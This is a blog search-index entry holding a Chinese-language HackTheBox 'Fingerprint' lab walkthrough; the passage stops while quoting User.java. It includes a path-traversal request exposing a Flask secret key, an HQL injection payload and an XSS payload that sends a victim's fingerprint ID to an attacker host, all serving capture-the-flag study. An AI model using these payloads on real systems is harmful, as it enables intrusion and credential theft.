<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>HackTheBox - Fingerprint</title>
    <link href="/2022/06/06/HTB/Fingerprint/"/>
    <url>/2022/06/06/HTB/Fingerprint/</url>
    
    <content type="html"><![CDATA[<h1 id="0x01-Recon-amp-Foothold"><a href="#0x01-Recon-amp-Foothold" class="headerlink" title="0x01 Recon &amp; Foothold"></a>0x01 Recon &amp; Foothold</h1><h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nmap</span> -sC -sV -Pn -v <span class="hljs-number">10.10.11.127</span><br></code></pre></td></tr></table></figure><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs coq">PORT     STATE SERVICE VERSION<br><span class="hljs-number">22</span>/tcp   open  ssh     OpenSSH <span class="hljs-number">7.6</span>p1 Ubuntu <span class="hljs-number">4</span>ubuntu0<span class="hljs-number">.5</span> (Ubuntu Linux; protocol <span class="hljs-number">2.0</span>)<br>| <span class="hljs-type">ssh</span>-hostkey:<br>|   <span class="hljs-type">2048</span> <span class="hljs-number">90</span>:<span class="hljs-number">65</span>:<span class="hljs-number">07</span>:<span class="hljs-number">35</span>:be:<span class="hljs-number">8</span>d:<span class="hljs-number">7</span>b:ee:ff:<span class="hljs-number">3</span>a:<span class="hljs-number">11</span>:<span class="hljs-number">96</span>:<span class="hljs-number">06</span>:a9:a1:b9 (RSA)<br>|   <span class="hljs-type">256</span> <span class="hljs-number">4</span>c:<span class="hljs-number">5</span>b:<span class="hljs-number">74</span>:d9:<span class="hljs-number">3</span>c:c0:<span class="hljs-number">60</span>:<span class="hljs-number">24</span>:e4:<span class="hljs-number">95</span>:<span class="hljs-number">2</span>f:b0:<span class="hljs-number">51</span>:<span class="hljs-number">84</span>:<span class="hljs-number">03</span>:c5 (ECDSA)<br>|<span class="hljs-type">_</span>  <span class="hljs-number">256</span> <span class="hljs-number">82</span>:f5:b0:d9:<span class="hljs-number">73</span>:<span class="hljs-number">18</span>:<span class="hljs-number">01</span>:<span class="hljs-number">47</span>:<span class="hljs-number">61</span>:f7:f6:<span class="hljs-number">26</span>:<span class="hljs-number">0</span>a:d5:cd:f2 (ED25519)<br><span class="hljs-number">80</span>/tcp   open  http    Werkzeug httpd <span class="hljs-number">1.0</span><span class="hljs-number">.1</span> (Python <span class="hljs-number">2.7</span><span class="hljs-number">.17</span>)<br>|<span class="hljs-type">_http</span>-title: mylog - Starting page<br>| <span class="hljs-type">http</span>-methods:<br>|<span class="hljs-type">_</span>  Supported Methods: HEAD OPTIONS GET<br>|<span class="hljs-type">_http</span>-server-header: Werkzeug/<span class="hljs-number">1.0</span><span class="hljs-number">.1</span> Python/<span class="hljs-number">2.7</span><span class="hljs-number">.17</span><br><span class="hljs-number">8080</span>/tcp open  http    Sun GlassFish <span class="hljs-keyword">Open</span> Source Edition  <span class="hljs-number">5.0</span><span class="hljs-number">.1</span><br>|<span class="hljs-type">_http</span>-title: secAUTH<br>| <span class="hljs-type">http</span>-methods:<br>|   <span class="hljs-type">Supported</span> Methods: GET HEAD POST PUT DELETE TRACE OPTIONS<br>|<span class="hljs-type">_</span>  Potentially risky methods: PUT DELETE TRACE<br>Service <span class="hljs-keyword">Info</span>: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br></code></pre></td></tr></table></figure><h2 id="site-80"><a href="#site-80" class="headerlink" title="site 80"></a>site 80</h2><p>访问站点能够发现一些信息，比如默认的<code>admin:admin</code>口令，以及网站后端是flask框架。</p><p><img src="/img/Fingerprint.assets/image-20220527192138309.png" alt="image-20220527192138309"></p><p>同时抓包也证实了这一点：</p><p><img src="/img/Fingerprint.assets/image-20220527190817136.png" alt="image-20220527190817136"></p><h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><p>扫描目录发现有一个<code>/admin</code>的端点，虽然是302跳转，但是返回的数据包大小反而比<code>/login</code>端点还要大。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">➤  feroxbuster --url http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">11.127</span><br>[...]<br><span class="hljs-number">200</span>      GET      <span class="hljs-number">206</span>l      <span class="hljs-number">633</span>w    <span class="hljs-number">10916</span>c http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">11.127</span>/<br><span class="hljs-number">302</span>      GET       <span class="hljs-number">59</span>l      <span class="hljs-number">104</span>w     <span class="hljs-number">1574</span>c http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">11.127</span><span class="hljs-regexp">/admin =&gt; http:/</span><span class="hljs-regexp">/10.10.11.127/</span>login<br><span class="hljs-number">200</span>      GET       <span class="hljs-number">36</span>l       <span class="hljs-number">77</span>w      <span class="hljs-number">901</span>c http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">11.127</span>/login<br></code></pre></td></tr></table></figure><p>我们使用Burp将将返回数据包的<code>302 FOUND</code>改成<code>200 OK</code>。</p><p><img src="/img/Fingerprint.assets/image-20220527193848620.png" alt="image-20220527193848620"></p><p>再次访问界面，发现可以查看一个<code>auth.log</code>的访问日志文件。在8080端口的站点进行登录认证时，会在这个日志文件中生成访问记录，这个文件我们后面会用到。</p><p><img src="/img/Fingerprint.assets/image-20220527194557966.png" alt="image-20220527194557966"></p><p><img src="/img/Fingerprint.assets/image-20220527203929551.png" alt="image-20220527203929551"></p><h3 id="路径穿越漏洞"><a href="#路径穿越漏洞" class="headerlink" title="路径穿越漏洞"></a>路径穿越漏洞</h3><p>蓝色的查看按钮指向链接<code> /admin/view/auth.log</code>，对该端点进行测试，能够发现有路径穿越漏洞。</p><p><img src="/img/Fingerprint.assets/image-20220527195034574.png" alt="image-20220527195034574"></p><p>flask经典的启动文件名就是app.py了，我们紧接着访问<code>/admin/view/../../../../../proc/self/cwd/app.py</code>即可拿到flask文件。</p><p>文件里面只有一个<code>SECRET_KEY</code>是我们值得关注的内容。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = <span class="hljs-string">&#x27;SjG$g5VZ(vHC;M2Xc/2~z(&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="site-8080"><a href="#site-8080" class="headerlink" title="site 8080"></a>site 8080</h2><p>随便发一个包看一下后端，是一个GlassFish的后端。</p><p><img src="/img/Fingerprint.assets/image-20220527191948250.png" alt="image-20220527191948250"></p><h3 id="目录扫描-1"><a href="#目录扫描-1" class="headerlink" title="目录扫描"></a>目录扫描</h3><p>扫描目录的结果也显示了这应该是一个Java Web网站：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk">➤  feroxbuster --depth <span class="hljs-number">1</span> --url http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">11.127</span>:<span class="hljs-number">8080</span>                                                     <br>[...]<br><span class="hljs-number">200</span>      GET      <span class="hljs-number">229</span>l      <span class="hljs-number">626</span>w    <span class="hljs-number">13020</span>c http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">11.127</span>:<span class="hljs-number">8080</span>/<br><span class="hljs-number">200</span>      GET       <span class="hljs-number">72</span>l      <span class="hljs-number">113</span>w     <span class="hljs-number">1733</span>c http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">11.127</span>:<span class="hljs-number">8080</span>/login<br><span class="hljs-number">405</span>      GET        <span class="hljs-number">1</span>l       <span class="hljs-number">74</span>w     <span class="hljs-number">1184</span>c http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">11.127</span>:<span class="hljs-number">8080</span>/upload<br><span class="hljs-number">301</span>      GET        <span class="hljs-number">6</span>l       <span class="hljs-number">13</span>w      <span class="hljs-number">185</span>c http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">11.127</span>:<span class="hljs-number">8080</span><span class="hljs-regexp">/resources =&gt; http:/</span><span class="hljs-regexp">/10.10.11.127:8080/</span>resources/<br><span class="hljs-number">301</span>      GET        <span class="hljs-number">6</span>l       <span class="hljs-number">13</span>w      <span class="hljs-number">183</span>c http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">11.127</span>:<span class="hljs-number">8080</span><span class="hljs-regexp">/WEB-INF =&gt; http:/</span><span class="hljs-regexp">/10.10.11.127:8080/</span>WEB-INF/<br><span class="hljs-number">301</span>      GET        <span class="hljs-number">6</span>l       <span class="hljs-number">13</span>w      <span class="hljs-number">183</span>c http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">11.127</span>:<span class="hljs-number">8080</span><span class="hljs-regexp">/backups =&gt; http:/</span><span class="hljs-regexp">/10.10.11.127:8080/</span>backups/<br><span class="hljs-number">302</span>      GET        <span class="hljs-number">6</span>l       <span class="hljs-number">13</span>w      <span class="hljs-number">180</span>c http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">11.127</span>:<span class="hljs-number">8080</span><span class="hljs-regexp">/welcome =&gt; http:/</span><span class="hljs-regexp">/10.10.11.127:8080/</span>login<br><span class="hljs-number">301</span>      GET        <span class="hljs-number">6</span>l       <span class="hljs-number">13</span>w      <span class="hljs-number">184</span>c http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">11.127</span>:<span class="hljs-number">8080</span><span class="hljs-regexp">/META-INF =&gt; http:/</span><span class="hljs-regexp">/10.10.11.127:8080/</span>META-INF/<br></code></pre></td></tr></table></figure><p>这个<code>backup</code>文件夹里应该是有东西的，结合这是一个<code>Java Web</code>网站，我们使用<code>-x</code>参数指定文件拓展名然后继续对<code>backup</code>文件夹进行扫描。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk">➤  feroxbuster --depth <span class="hljs-number">1</span> --url http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">11.127</span>:<span class="hljs-number">8080</span><span class="hljs-regexp">/backups/</span> -x java,jsp,class<br><br>[...]<br><br><span class="hljs-number">200</span>      GET       <span class="hljs-number">54</span>l      <span class="hljs-number">122</span>w     <span class="hljs-number">1444</span>c http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">11.127</span>:<span class="hljs-number">8080</span><span class="hljs-regexp">/backups/</span>User.java<br><span class="hljs-number">200</span>      GET       <span class="hljs-number">43</span>l       <span class="hljs-number">99</span>w     <span class="hljs-number">1060</span>c http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">11.127</span>:<span class="hljs-number">8080</span><span class="hljs-regexp">/backups/</span>Profile.java<br><span class="hljs-number">401</span>      GET        <span class="hljs-number">1</span>l       <span class="hljs-number">52</span>w     <span class="hljs-number">1094</span>c http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">11.127</span>:<span class="hljs-number">8080</span><span class="hljs-regexp">/backups/</span>j_security_check<br></code></pre></td></tr></table></figure><h3 id="HQL注入"><a href="#HQL注入" class="headerlink" title="HQL注入"></a>HQL注入</h3><p>对登录过程进行抓包，发现除了常见的用户名密码外还有一个<code>auth_secondary</code>字段，且作了改动后服务器会返回<code>500 Internal Server Error</code>。</p><p><img src="/img/Fingerprint.assets/image-20220527200838766.png" alt="image-20220527200838766"></p><p>不过通过报错信息我们能够发现这个后端使用了Hibernate这样一个框架来作为ORM框架，与这个框架有关的就是HQL注入了。</p><p><img src="/img/Fingerprint.assets/image-20220527200951363.png" alt="image-20220527200951363"></p><p>尝试让单引号闭合，报错如下：</p><p><img src="/img/Fingerprint.assets/image-20220527202924349.png" alt="image-20220527202924349"></p><p>我们尝试让执行的HQL返回一条记录，比如使用这样一个payload：<code>&#39; or username=&#39;admin</code>。使用该payload可以看到服务器不再返回<code>500 Internal Server Error</code>的错误了，而是显示<code>Invalid fingerprint-ID</code>。我们再看看能不能绕过对<code>fingerprint-ID</code>的校验吧。</p><p><img src="/img/Fingerprint.assets/image-20220527202959824.png" alt="image-20220527202959824"></p><p>在<code>/resources/js/login.js</code>端点下能够发现相关函数<code>getFingerPrintID</code>的定义。通览代码后不难发现这个<code>fingerprint</code>其实指代的就是浏览器的指纹。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">getFingerPrintID</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">let</span> fingerprint = navigator.<span class="hljs-property">appCodeName</span> + navigator.<span class="hljs-property">appVersion</span> + (navigator.<span class="hljs-property">cookieEnabled</span> ? <span class="hljs-string">&quot;yes&quot;</span> : <span class="hljs-string">&quot;no&quot;</span>) + navigator.<span class="hljs-property">language</span> + navigator.<span class="hljs-property">platform</span> +<br>        navigator.<span class="hljs-property">productSub</span> + navigator.<span class="hljs-property">userAgent</span> + navigator.<span class="hljs-property">vendor</span> + screen.<span class="hljs-property">availWidth</span> + <span class="hljs-string">&quot;&quot;</span><br>        + screen.<span class="hljs-property">availHeight</span> + <span class="hljs-string">&quot;&quot;</span> + screen.<span class="hljs-property">width</span> + <span class="hljs-string">&quot;&quot;</span> + screen.<span class="hljs-property">height</span> + <span class="hljs-string">&quot;&quot;</span> +<br>        screen.<span class="hljs-property">orientation</span>.<span class="hljs-property">type</span> + <span class="hljs-string">&quot;&quot;</span> + screen.<span class="hljs-property">pixelDepth</span> + <span class="hljs-string">&quot;&quot;</span> + screen.<span class="hljs-property">colorDepth</span> +<br>        <span class="hljs-title class_">Intl</span>.<span class="hljs-title class_">DateTimeFormat</span>().<span class="hljs-title function_">resolvedOptions</span>().<span class="hljs-property">timeZone</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> plugin <span class="hljs-keyword">of</span> navigator.<span class="hljs-property">plugins</span>) &#123;<br>        fingerprint += plugin.<span class="hljs-property">name</span> + <span class="hljs-string">&quot;,&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> mime <span class="hljs-keyword">of</span> navigator.<span class="hljs-property">mimeTypes</span>) &#123;<br>        fingerprint += mime.<span class="hljs-property">type</span> + <span class="hljs-string">&quot;,&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">MD5</span>(fingerprint)<br>&#125;<br></code></pre></td></tr></table></figure><p>在浏览器的console界面可以查看这个<code>getFingerPrintID</code>使用的对象，以<code>navigator</code>为例，如下：</p><p><img src="/img/Fingerprint.assets/image-20220530154353233.png" alt="image-20220530154353233"></p><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><p>那现在看来就是这个登录界面通过对浏览器指纹进行识别做了白名单限制，亦即需要搞到一个合法的<code>fingerprint-ID</code>。</p><p>首先因为存在HQL注入，我们理论上可以通过HQL盲注来获取<code>fingerprint-ID</code>，这是第一种方案；</p><p>但是在接下来的测试中我们发现有XSS，还记得一开始我们提到的<code>auth.log</code>吗，我们输入任意XSS payload，比如经典的<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，在80端口查看<code>auth.log</code>，如下：</p><p><img src="/img/Fingerprint.assets/test.png" alt="test"></p><p>在验证成功存在XSS后，另一个可行的方案是使用XSS拿到可能存在的BOT的<code>fingerprint-ID</code>。所以构造payload如下，当然也可以封装成一个<code>evil.js</code>，然后放在本机让服务器来访问。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;script src=<span class="hljs-string">&quot;http://10.10.11.127:8080/resources/js/login.js&quot;</span>&gt;&lt;/script&gt; <br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(<span class="hljs-string">&quot;&lt;img src=http://10.10.16.16/&quot;</span>+<span class="hljs-title function_">getFingerPrintID</span>()+<span class="hljs-string">&quot;&gt;&lt;/img&gt;&quot;</span>);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>将payload输入后点击登录：</p><p><img src="/img/Fingerprint.assets/image-20220527211236544.png" alt="image-20220527211236544"></p><p>稍等即可拿到BOT的<code>fingerprint-ID</code>。</p><p><img src="/img/Fingerprint.assets/image-20220527211334013.png" alt="image-20220527211334013"></p><p>我们选择来自服务器的<code>fingerprint-ID</code>，即<code>962f4a03aa7ebc0515734cf398b0ccd6</code>。</p><p>输入该<code>fingerprint-ID</code>，和预期结果不太一样的是依旧是之前的报错信息：</p><p><img src="/img/Fingerprint.assets/image-20220527211710797.png" alt="image-20220527211710797"></p><p>在确认之前的步骤没有问题后，一个推测是这个<code>fingerprint-ID</code>并不是admin的，而是另外的用户的。于是在假设<code>fingerprint-ID</code>唯一的情况下，我们可以将<code>username</code>中的逻辑取反，即让<code>username</code>不等于<code>admin</code>（使用<code>&lt;&gt;</code>）。再次尝试登录，结果如下：</p><p><img src="/img/Fingerprint.assets/image-20220527211650482.png" alt="image-20220527211650482"></p><h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p>点击链接，跳转到一个可以上传文件的页面。</p><p><img src="/img/Fingerprint.assets/image-20220527214841872.png" alt="image-20220527214841872"></p><p>这里我的界面没有加载出来，也上传不了文件。一番探索后发现是被墙了，需要挂梯子。。</p><p>挂了梯子后页面能够正常加载了，也能正常上传文件了。</p><p><img src="/img/Fingerprint.assets/image-20220527215448645.png" alt="image-20220527215448645"></p><p>上传文件后能够发现上传目录为<code>/data/uploads</code>。然后就没有别的了，也不能查看，也没有其他后续操作。</p><p><img src="/img/Fingerprint.assets/image-20220527215631785.png" alt="image-20220527215631785"></p><h3 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h3><p>同时我们还发现了发送的数据包中有<code>JWT</code>的存在，复制出来放到<code>jwt.io</code>中进行解码，如下。然后使用之前拿到的<code>SECRET_KEY</code>能够成功校验签名。</p><p><img src="/img/Fingerprint.assets/image-20220527214026711.png" alt="image-20220527214026711"></p><p><code>user</code>的值在解码后依旧不是明文，尝试再次base64解码，如下所示。可以看出大概这就是一个Java的序列化文件。通过这个字符串能够得出这是一个<code>User</code>对象，其他的字符串应该就是用户名、密码和<code>fingerprint-ID</code>了。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">➤</span>  <span class="hljs-string">echo</span> <span class="hljs-string">&quot;rO0ABXNyACFjb20uYWRtaW4uc2VjdXJpdHkuc3JjLm1vZGVsLlVzZXKUBNdz41+5awIABEkAAmlkTAALZmluZ2VycHJpbnR0ABJMamF2YS9sYW5nL1N0cmluZztMAAhwYXNzd29yZHEAfgABTAAIdXNlcm5hbWVxAH4AAXhwAAAAAnQAQDdlZjUyYzI1MWY4MDQ0Y2IxODcwMTM5OTI4OTFkMGU1OGNlOTE5NGRlN2Y1MzViMWI0ZmE2YmJmZTA4Njc4ZjZ0ABRMV2c3Z1VSMUVtWDdVTnhzSnhxWnQAC21pY2hlYWwxMjM1&quot;</span> <span class="hljs-string">|</span> <span class="hljs-string">base64</span> <span class="hljs-string">-d</span> <span class="hljs-string">|xxd</span><br><br><span class="hljs-attr">00000000:</span> <span class="hljs-string">aced</span> <span class="hljs-number">0005 </span><span class="hljs-number">7372 </span><span class="hljs-number">0021 </span><span class="hljs-string">636f</span> <span class="hljs-string">6d2e</span> <span class="hljs-number">6164 </span><span class="hljs-string">6d69</span>  <span class="hljs-string">....sr.!com.admi</span><br><span class="hljs-attr">00000010:</span> <span class="hljs-string">6e2e</span> <span class="hljs-number">7365 </span><span class="hljs-number">6375 </span><span class="hljs-number">7269 </span><span class="hljs-number">7479 </span><span class="hljs-number">2e73</span> <span class="hljs-number">7263 </span><span class="hljs-string">2e6d</span>  <span class="hljs-string">n.security.src.m</span><br><span class="hljs-attr">00000020:</span> <span class="hljs-string">6f64</span> <span class="hljs-string">656c</span> <span class="hljs-number">2e55</span> <span class="hljs-number">7365 </span><span class="hljs-number">7294 </span><span class="hljs-string">04d7</span> <span class="hljs-number">73e3</span> <span class="hljs-string">5fb9</span>  <span class="hljs-string">odel.User...s._.</span><br><span class="hljs-attr">00000030:</span> <span class="hljs-string">6b02</span> <span class="hljs-number">0004 </span><span class="hljs-number">4900 </span><span class="hljs-number">0269 </span><span class="hljs-string">644c</span> <span class="hljs-string">000b</span> <span class="hljs-number">6669 </span><span class="hljs-number">6e67</span>  <span class="hljs-string">k...I..idL..fing</span><br><span class="hljs-attr">00000040:</span> <span class="hljs-number">6572 </span><span class="hljs-number">7072 </span><span class="hljs-string">696e</span> <span class="hljs-number">7474 </span><span class="hljs-number">0012 </span><span class="hljs-string">4c6a</span> <span class="hljs-number">6176 </span><span class="hljs-string">612f</span>  <span class="hljs-string">erprintt..Ljava/</span><br><span class="hljs-attr">00000050:</span> <span class="hljs-string">6c61</span> <span class="hljs-number">6e67</span> <span class="hljs-string">2f53</span> <span class="hljs-number">7472 </span><span class="hljs-string">696e</span> <span class="hljs-string">673b</span> <span class="hljs-string">4c00</span> <span class="hljs-number">0870  </span><span class="hljs-string">lang/String;L..p</span><br><span class="hljs-attr">00000060:</span> <span class="hljs-number">6173 </span><span class="hljs-number">7377 </span><span class="hljs-string">6f72</span> <span class="hljs-number">6471 </span><span class="hljs-string">007e</span> <span class="hljs-number">0001 </span><span class="hljs-string">4c00</span> <span class="hljs-number">0875  </span><span class="hljs-string">asswordq.~..L..u</span><br><span class="hljs-attr">00000070:</span> <span class="hljs-number">7365 </span><span class="hljs-string">726e</span> <span class="hljs-string">616d</span> <span class="hljs-number">6571 </span><span class="hljs-string">007e</span> <span class="hljs-number">0001 </span><span class="hljs-number">7870 </span><span class="hljs-number">0000  </span><span class="hljs-string">sernameq.~..xp..</span><br><span class="hljs-attr">00000080:</span> <span class="hljs-number">0002 </span><span class="hljs-number">7400 </span><span class="hljs-number">4037 </span><span class="hljs-number">6566 </span><span class="hljs-number">3532 </span><span class="hljs-number">6332 </span><span class="hljs-number">3531 </span><span class="hljs-number">6638</span>  <span class="hljs-string">..t.@7ef52c251f8</span><br><span class="hljs-attr">00000090:</span> <span class="hljs-number">3034 </span><span class="hljs-number">3463 </span><span class="hljs-number">6231 </span><span class="hljs-number">3837 </span><span class="hljs-number">3031 </span><span class="hljs-number">3339 </span><span class="hljs-number">3932 </span><span class="hljs-number">3839  </span><span class="hljs-string">044cb18701399289</span><br><span class="hljs-attr">000000a0:</span> <span class="hljs-number">3164 </span><span class="hljs-number">3065 </span><span class="hljs-number">3538 </span><span class="hljs-number">6365 </span><span class="hljs-number">3931 </span><span class="hljs-number">3934 </span><span class="hljs-number">6465 </span><span class="hljs-number">3766  </span><span class="hljs-string">1d0e58ce9194de7f</span><br><span class="hljs-attr">000000b0:</span> <span class="hljs-number">3533 </span><span class="hljs-number">3562 </span><span class="hljs-number">3162 </span><span class="hljs-number">3466 </span><span class="hljs-number">6136 </span><span class="hljs-number">6262 </span><span class="hljs-number">6665 </span><span class="hljs-number">3038  </span><span class="hljs-string">535b1b4fa6bbfe08</span><br><span class="hljs-attr">000000c0:</span> <span class="hljs-number">3637 </span><span class="hljs-number">3866 </span><span class="hljs-number">3674 </span><span class="hljs-number">0014 </span><span class="hljs-string">4c57</span> <span class="hljs-number">6737 </span><span class="hljs-number">6755 </span><span class="hljs-number">5231  </span><span class="hljs-string">678f6t..LWg7gUR1</span><br><span class="hljs-attr">000000d0:</span> <span class="hljs-string">456d</span> <span class="hljs-number">5837 </span><span class="hljs-string">554e</span> <span class="hljs-number">7873 </span><span class="hljs-string">4a78</span> <span class="hljs-string">715a</span> <span class="hljs-number">7400 </span><span class="hljs-string">0b6d</span>  <span class="hljs-string">EmX7UNxsJxqZt..m</span><br><span class="hljs-attr">000000e0:</span> <span class="hljs-number">6963 </span><span class="hljs-number">6865 </span><span class="hljs-string">616c</span> <span class="hljs-number">3132 </span><span class="hljs-number">3335                 </span><span class="hljs-string">icheal1235</span><br></code></pre></td></tr></table></figure><p><code>file</code>命令也验证了这是一个序列化文件。</p><p><img src="/img/Fingerprint.assets/image-20220527214225003.png" alt="image-20220527214225003"></p><h2 id="综合利用"><a href="#综合利用" class="headerlink" title="综合利用"></a>综合利用</h2><h3 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h3><p>利用的话应该就涉及到源代码的审计了，我们将之前拿到的几个java文件陈列如下：</p><p>User.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.admin.security.src.model;<br><br><span class="hljs-keyword">import</span> com.admin.security.src.utils.FileUtil;<br><span class="hljs-keyword">import</span> com.admin.security.src.utils.SerUtils;<br><span class="hljs-keyword">import</span> lombok.AllArgsConstructor;<br><span class="hljs-keyword">import</span> lombok.Data;<br><span class="hljs-keyword">import</span> lombok.NoArgsConstructor;<br><br><span class="hljs-keyword">import</span> javax.persistence.*;<br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><br><span class="hljs-comment">// import com.admin.security.src.model.UserProfileStorage;</span><br><span class="hljs-meta">@AllArgsConstructor</span><br><span class="hljs-meta">@NoArgsConstructor</span><br><span class="hljs-meta">@Entity</span><br><span class="hljs-meta">@Data</span><br><span class="hljs-meta">@Table(name = &quot;users&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> -<span class="hljs-number">7780857363453462165L</span>;<br><br>    <span class="hljs-meta">@Id</span><br>    <span class="hljs-meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span><br>    <span class="hljs-meta">@Column(name = &quot;id&quot;)</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-type">int</span> id;<br><br>    <span class="hljs-meta">@Column(name = &quot;username&quot;)</span><br>    <span class="hljs-keyword">protected</span> String username;<br><br>    <span class="hljs-meta">@Column(name = &quot;password&quot;)</span><br>    <span 